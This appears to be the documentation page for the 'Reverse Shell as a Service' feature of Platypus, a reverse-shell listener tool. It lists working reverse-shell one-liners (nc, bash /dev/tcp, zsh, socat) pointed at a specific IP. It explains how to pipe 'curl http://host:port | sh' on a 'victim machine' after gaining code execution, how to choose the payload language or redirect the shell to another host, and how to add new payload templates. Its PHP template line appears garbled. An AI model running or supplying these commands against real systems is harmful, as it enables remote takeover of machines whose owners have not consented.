# RaaS

!!! Warning
    本功能仅针对 `*NIX` 客户端，暂不支持 Windows。

![](/images/webui/raas.gif)

Platypus is able to multiplex the reverse shell listening port. Port `13337 / 1338` can handle reverse shell client connections.  
Also, There is another interesting feature that platypus provides, which is called `Reverse Shell as a Service (RaaS)`.

Assume that you have got an arbitrary RCE on the target application, but the target application will strip the non-alphabet letter like `&`, `>`. then this feature will be useful.
Like you have already used before, here are some **BAD** examples:

```bash
nc -e /bin/bash 192.168.174.132 8080
bash -c 'bash -i >/dev/tcp/192.168.174.132/8080 0>&1'
zsh -c 'zmodload zsh/net/tcp && ztcp 192.168.174.132 8080 && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.174.132:8080
```

To archive your aim, all you need is to construct a URL that indicates the target.

The command `bash -c "bash -i >/dev/tcp/5.6.7.8/13337 0>&1"` is the equivalent of `curl http://1.2.3.4:13337/5.6.7.8/13337 | sh`, this feature provides the capability to redirect a new reverse shell to another IP and port without remembering the boring reverse shell command.

If you just want to pop up a reverse shell to the listening port of platypus, the parameter (`1.2.3.4/13337`) can be omitted.

Once the command gets executed, the reverse shell session will appear in platypus which is listening on `1.2.3.4:13337`.

## Quick start

1. Start platypus and listen to any port (eg: 1.2.3.4 13337)
2. Execute `curl http://1.2.3.4:13337 | sh` on the victim machine

## Specifying language of reverse shell command (default: bash)

Also, you can specify the specific language of creating a reverse shell. All available languages are listed at [templates](https://github.com/WangYihang/Platypus/tree/master/assets/template/rsh)

1. Start platypus and listen to any port (eg: 1.2.3.4 13337)
2. Execute `curl http://1.2.3.4:13337/python | sh` on the victim machine

## What if I want to pop up the reverse shell to another IP (5.6.7.8) and port (7331)?

By default, the new reverse shell will be popped up to the server which the port which the HTTP request sent, but you can simply change the IP and port by following these steps:

1. Start platypus and listen to any port (eg: 1.2.3.4 13337)
2. Execute `curl http://1.2.3.4:13337/5.6.7.8/7331/python | sh` on the victim machine

## How to add a new language

Currently, platypus support `awk`, `bash`, `go`, `Lua`, `NC`, `Perl`, `PHP`, `python` and `ruby` that were simply stolen from [PayloadAllThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md), and you can check `templates` folder to view all templates. Also, adding new language support is simple, just replace the real IP and port with `__HOST__` and `__PORT__`.

```bash
php -r '$sock=fsockopen("__HOST__",`popen /bin/sh -i <&3 >&3 2>&3", "r");'`
```

Then you should use `go-bindata` to add the template file as an asset of Platypus by typing the following command.

```
go get -u github.com/go-bindata/go-bindata/...
go-bindata -pkg assets -o ./internal/util/assets/assets.go ./assets/config.example.yml ./assets/template/rsh/... ./web/ttyd/dist/... ./web/frontend/build/... ./build/termite/...
```
